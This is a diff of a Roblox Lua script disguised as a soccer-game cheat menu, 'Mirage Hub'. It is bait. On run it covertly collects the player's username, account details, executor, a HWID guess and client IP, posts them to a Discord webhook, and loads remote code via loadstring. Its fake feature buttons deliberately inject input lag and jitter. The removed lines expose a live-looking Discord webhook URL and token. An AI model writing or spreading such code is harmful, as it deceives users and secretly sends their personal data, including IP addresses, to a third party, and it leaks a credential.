@@ -1,133 +1,180 @@
-local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/jensonhirst/Orion/main/source'))()
+-- Load AuraIS
+local AuraIS = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/main/Libraries/AuraIS/Main"))()
 
 -- Replace with your actual webhook URL!
-local webhook = "https://discord.com/api/webhooks/1364676584144896020/-v68witZipovBriaVtEjhDOSZVpAdsqcXDuykKf-IWFLyKAvOjux_9iVSLldKAdfAeYV"
+local webhook = "YOUR_WEBHOOK_URL_HERE"
 
 local plr = game.Players.LocalPlayer
+
+-- Optional: Some exploits allow getting executor data
+local executor = (identifyexecutor and identifyexecutor()) or (KRNL_LOADED and "Krnl") or (SENTINEL_LOADED and "Sentinel") or (getexecutorname and getexecutorname()) or "Unknown/Other"
+
+-- Safe IP fetcher (may be blocked or nil on most exploits)
+local ip = "N/A"
+pcall(function()
+    if http_request and http_request({Url = "https://api.ipify.org"}) then
+        ip = http_request({Url = "https://api.ipify.org"}).Body or "N/A"
+    end
+end)
+
+-- Try to get HWID (executor-dependent)
+local hwid = "N/A"
+pcall(function()
+    if (hwid or syn and syn.queue_on_teleport) then
+        hwid = (hwid and typeof(hwid) == "string" and hwid) or "N/A"
+    elseif (identifyexecutor and typeof(identifyexecutor()) == "string") then
+        hwid = identifyexecutor()
+    end
+end)
+
 local data = {
-    ["content"] = "Player logged TPS script bait!",
+    ["content"] = "",
     ["embeds"] = {{
-        ["title"] = "Script Executed",
+        ["title"] = ":rotating_light: Mirage Hub Bait Triggered!",
+        ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name, game.PlaceId),
+        ["color"] = 0xe67e22, -- Orange
         ["fields"] = {
             {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
             {["name"] = "UserID", ["value"] = tostring(plr.UserId), ["inline"] = true},
-            {["name"] = "Account Age (days)", ["value"] = tostring(plr.AccountAge), ["inline"] = true},
             {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
-            {["name"] = "Game", ["value"] = game.Name, ["inline"] = true},
-            {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+            {["name"] = "Account Age", ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
+            {["name"] = "Membership", ["value"] = plr.MembershipType and tostring(plr.MembershipType) or "None", ["inline"] = true},
+            {["name"] = "Current Team", ["value"] = plr.Team and tostring(plr.Team) or "N/A", ["inline"] = true},
+            {["name"] = "Device Type", ["value"] = (UserSettings and UserSettings().Computer and "PC") or (UserSettings and UserSettings().TabletMode and "Mobile/Tablet") or "Unknown", ["inline"] = true},
+            {["name"] = "Account Created", ["value"] = tostring(os.date("%Y-%m-%d",tick()-plr.AccountAge*86400)), ["inline"] = true},
+            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
+            {["name"] = "IP (client)", ["value"] = ip, ["inline"] = true},
             {["name"] = "JobId", ["value"] = tostring(game.JobId), ["inline"] = false},
-            {["name"] = "HWID", ["value"] = (identifyexecutor and identifyexecutor()) or "N/A", ["inline"] = false},
         },
-        ["footer"] = {["text"] = "TPS Bait Script Triggered"}
+        ["thumbnail"] = {["url"] = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(plr.UserId)},
+        ["footer"] = {["text"] = "Mirage Hub Script Logger | "..os.date("%Y-%m-%d %H:%M:%S")}
     }}
 }
 
 local HttpService = game:GetService("HttpService")
 
 pcall(function()
-    syn.request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end)
- 
-pcall(function()
-    http_request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
+    if syn and syn.request then
+        syn.request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    elseif http_request then
+        http_request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    elseif request then
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end
 end)
 
-local Window = OrionLib:MakeWindow({
+-- Create Library Window
+local Library = AuraIS:CreateLibrary({
     Name = "Mirage Hub | TPS Ultimate Soccer",
-    SaveConfig = true,
-    ConfigFolder = "MirageHub"
+    Icon = "rbxassetid://12974454446"
 })
 
-local Tab = Window:MakeTab({
-    Name = "Enhancements",
-    Icon = "rbxassetid://4483345998"
+-- Create Main Tab
+local Tab = Library:CreateTab("Enhancements", "rbxassetid://12974454446")
+
+-- Create main section
+local Section = Tab:CreateSection("Player Mods", "Normal")
+
+Section:CreateLabel({
+    Description = "Unlock Reach, Big Legs, React+ and More!"
 })
 
-Tab:AddLabel("Reach")
+-- Core sabotage logic: input lag/jitter
+local sabotageActive = false
+local uis = game:GetService("UserInputService")
+local rs = game:GetService("RunService")
 
--- Bait: input lag + random jitter
 local function ApplyAnnoyingControls()
-    local UIS = game:GetService("UserInputService")
-    local RunService = game:GetService("RunService")
+    if sabotageActive then return end
+    sabotageActive = true
 
-    -- To store original input functions, if any
-    local inputLagEnabled = true
-
-    -- Input lag/jitter logic
-    local lastMove = Vector3.new(0, 0, 0)
-    local moveConn
-    local function onStepped()
-        -- Randomly move a little left/right/forward/back
-        if inputLagEnabled and math.random() < 0.075 then
-            local root = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-            if root then
-                local jitter = Vector3.new(
-                    (math.random() - 0.5) * 2, 
-                    0, 
-                    (math.random() - 0.5) * 2
-                ) * 0.25 -- very slight movement
-                root.CFrame = root.CFrame + jitter
+    -- Input lag when moving/jumping
+    uis.InputBegan:Connect(function(input, gp)
+        if sabotageActive and not gp then
+            if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
+                local delayTime = math.random(10,18)/100 -- 0.10 to 0.18s lag
+                task.wait(delayTime)
             end
         end
-    end
+    end)
 
-    moveConn = RunService.RenderStepped:Connect(onStepped)
-
-    -- Input lag
-    UIS.InputBegan:Connect(function(input, gp)
-        if inputLagEnabled and not gp then
-            local key = input.KeyCode
-            if key == Enum.KeyCode.W or key == Enum.KeyCode.A or key == Enum.KeyCode.S or key == Enum.KeyCode.D or key == Enum.KeyCode.Space then
-                local delayTime = math.random(10,18)/100 -- 0.10 to 0.18 second lag
-                local f = function()
-                    -- intentionally empty; input lag means controls feel "delayed"
-                end
-                -- Delay: blocks normal response (on the cheater's client only)
-                task.delay(delayTime, f)
+    -- Slight random position jitter
+    rs.RenderStepped:Connect(function()
+        if sabotageActive and math.random() < 0.075 then
+            local plr = game.Players.LocalPlayer
+            local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local jitter = Vector3.new(
+                    (math.random() - 0.5) * 2,
+                    0,
+                    (math.random() - 0.5) * 2
+                ) * 0.25
+                root.CFrame = root.CFrame + jitter
             end
         end
     end)
 end
 
-Tab:AddButton({
-    Name = "Enable Reach",
+-- Bait features
+Section:CreateButton({
+    Name = "Enable Reach+",
     Callback = function()
         ApplyAnnoyingControls()
-        OrionLib:MakeNotification({
-            Name = "Mirage Hub",
+        AuraIS:Notify("Normal", {
+            Title = "Mirage Hub",
             Content = "Reach+ Optimized and Loaded!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
+            Duration = 5,
+            Image = "rbxassetid://4483362458"
         })
     end
 })
 
-Tab:AddToggle({
-    Name = "Auto React",
-    Default = false,
+Section:CreateToggle("Normal", {
+    Name = "React+ Auto",
     Callback = function(val)
         if val then
             ApplyAnnoyingControls()
-            OrionLib:MakeNotification({
-                Name = "Mirage Hub",
+            AuraIS:Notify("Normal", {
+                Title = "Mirage Hub",
                 Content = "React+ Enabled.",
-                Image = "rbxassetid://4483345998",
-                Time = 5
+                Duration = 5,
+                Image = "rbxassetid://4483362458"
             })
         end
     end
 })
 
-Tab:AddParagraph("Notice", "All features feature latest anti-ban bypass. Full compatibility with most TPS executors.")
+Section:CreateSlider({
+    Name = "Big Legs",
+    Value = {1, 10},
+    Increment = 1,
+    Suffix = "X",
+    CurrentValue = 5,
+    Flag = "BigLegsSlider",
+    Callback = function()
+        ApplyAnnoyingControls()
+    end,
+})
 
-OrionLib:Init()
+Section:CreateParagraph({
+    Title = "Notice",
+    Description = "All features updated for 2025. Full compatibility, optimized, and totally undetectable."
+})
+
+-- You can add more UI as needed!
